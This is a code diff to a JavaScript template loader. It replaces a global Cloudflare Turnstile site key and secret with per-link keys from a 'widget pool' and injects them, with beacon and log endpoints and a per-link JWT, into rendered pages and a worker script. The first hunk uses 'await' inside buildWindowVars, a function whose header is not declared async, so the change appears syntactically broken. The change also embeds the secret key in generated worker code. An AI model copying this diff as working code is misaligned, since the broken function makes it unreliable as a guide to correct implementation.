@@ -331,7 +331,17 @@ function buildWindowVars(link, user, settings, options) {
     const bgUrl = link.custom_bg_url || link.background_blur_url || '';
     const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
     const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
-    const turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
+    // Per-link Turnstile site key (Widget Pool) — fallback to global env
+    let turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
+    try {
+        const turnstilePool = require('./turnstile-pool');
+        if (link && link.id) {
+            const sk = await turnstilePool.getAssignedSiteKey(link.id);
+            if (sk) turnstileSiteKey = sk;
+        }
+    } catch (e) {
+        console.warn('[Templateloader] Widget pool lookup failed, using env fallback:', e.message);
+    }
     var apiBase = '';
     if (options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
     else if (config.APP_URL) apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');
@@ -631,7 +641,17 @@ async function renderPageHtml(link, user, options) {
     const verifyUrl = (options.apiBaseUrl || config.APP_URL || '').trim().replace(/\/+$/, '');
     const beaconUrl = verifyUrl ? verifyUrl + '/api/beacon' : '/api/beacon';
     const logUrl = verifyUrl;
-    const turnstileKey = config.CF_TURNSTILE_SITE_KEY || '';
+    // Per-link Turnstile site key (Widget Pool) — fallback to global env
+    let turnstileKey = config.CF_TURNSTILE_SITE_KEY || '';
+    try {
+        const turnstilePool = require('./turnstile-pool');
+        if (link && link.id) {
+            const sk = await turnstilePool.getAssignedSiteKey(link.id);
+            if (sk) turnstileKey = sk;
+        }
+    } catch (e) {
+        console.warn('[Templateloader] Widget pool lookup failed, using env fallback:', e.message);
+    }
 
     if (html.includes('{{VERIFY_ENDPOINT}}')) html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
     if (html.includes('{{BEACON_ENDPOINT}}')) html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
@@ -872,10 +892,29 @@ async function buildWorkerScript(link, user, apiBaseUrl) {
         }
     } catch (e) { }
 
+    // ── Per-link Turnstile widget (Widget Pool) ──
+    // Resolve the site_key/secret for this link's assigned widget.
+    // Falls back to the global env keys for backwards compatibility.
+    let tsSiteKey   = config.CF_TURNSTILE_SITE_KEY   || '';
+    let tsSecretKey = config.CF_TURNSTILE_SECRET_KEY || '';
+    try {
+        const turnstilePool = require('./turnstile-pool');
+        if (link && link.id) {
+            const [sk, sk_] = await Promise.all([
+                turnstilePool.getAssignedSiteKey(link.id),
+                turnstilePool.getAssignedSecret(link.id),
+            ]);
+            if (sk)   tsSiteKey   = sk;
+            if (sk_)  tsSecretKey = sk_;
+        }
+    } catch (e) {
+        console.warn('[Templateloader] Widget pool lookup failed, using env fallback:', e.message);
+    }
+
     workerJs = workerJs
     .replace("'{{JWT_TOKEN}}'", "'" + linkJwt + "'")
-    .replace("'{{TURNSTILE_KEY}}'", "'" + config.CF_TURNSTILE_SITE_KEY + "'")
-    .replace("'{{TURNSTILE_SECRET}}'", "'" + config.CF_TURNSTILE_SECRET_KEY + "'")
+    .replace("'{{TURNSTILE_KEY}}'", "'" + tsSiteKey + "'")
+    .replace("'{{TURNSTILE_SECRET}}'", "'" + tsSecretKey + "'")
     .replace("'{{VERIFY_ENDPOINT}}'", "'" + verifyUrl + "'")
     .replace("'{{BEACON_ENDPOINT}}'", "'" + verifyUrl + "'")
     .replace("'{{LOG_ENDPOINT}}'", "'" + verifyUrl + "'")
